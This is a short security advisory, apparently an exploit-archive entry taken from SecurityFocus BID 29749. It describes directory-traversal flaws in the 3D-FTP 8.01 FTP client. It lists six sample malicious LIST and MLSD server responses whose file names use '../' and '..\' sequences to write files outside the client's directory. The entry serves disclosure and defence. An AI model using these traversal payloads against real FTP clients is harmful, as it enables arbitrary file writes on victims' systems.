@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/29749/info
+
+3D-FTP is prone to multiple directory-traversal vulnerabilities because it fails to sufficiently sanitize user-supplied input data.
+
+Exploiting these issues allows an attacker to write arbitrary files to locations outside of the FTP client's current directory. This could help the attacker launch further attacks.
+
+3D-FTP 8.01 is vulnerable; other versions may also be affected. 
+
+The following example responses are available:
+Response to LIST (backslash):
+-rw-r--r-- 1 ftp ftp 20 Mar 01 05:37 \..\..\..\..\..\..\..\..\..\testfile.txt\r\n
+
+Response to LIST (forward-slash):
+-rw-r--r-- 1 ftp ftp 20 Mar 01 05:37 /../../../../../../../../../testfile.txt\r\n
+
+Response to LIST (combination):
+-rw-r--r-- 1 ftp ftp 20 Mar 01 05:37 ../..\/..\/..\/../..\/../..\/../testfile.txt\r\n
+
+Response to MLSD (backslash):
+type=file;modify=20080227074710;size=20; \..\..\..\..\..\..\..\..\..\testfile.txt\r\n
+
+Response to MLSD (forward-slash):
+type=file;modify=20080227074710;size=20; /../../../../../../../../../testfile.txt\r\n
+
+Response to MLSD (combination):
+type=file;modify=20080227074710;size=20; ../..\/..\/..\/../..\/../..\/../testfile.txt\r\n 
